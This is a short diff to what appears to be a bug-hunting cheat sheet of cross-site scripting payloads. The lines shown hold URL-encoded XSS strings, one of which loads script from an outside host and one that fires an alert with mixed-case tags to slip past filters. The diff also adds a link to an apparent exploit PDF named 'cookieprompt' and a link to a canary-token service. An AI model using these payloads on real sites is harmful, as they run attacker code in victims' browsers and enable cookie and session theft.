@@ -41,6 +41,10 @@ e%27"()%26%25<zzz>%27"><script%20src=https://jso-tools.z-x.my.id/raw/~/RD9CXXDM0
 Xss Alert:
 e%27"()%26%25<zzz><ScRiPt%20>alert(9155)</ScRiPt>
 
+PDF-prompt:
+https://raw.githubusercontent.com/coffinxp/pdFExploits/refs/heads/main/cookieprompt.pdf
+
+CanaryTokens: https://canarytokens.org/nest/
 
 --------------------------------------------------------------------------------------------------------------------------
 
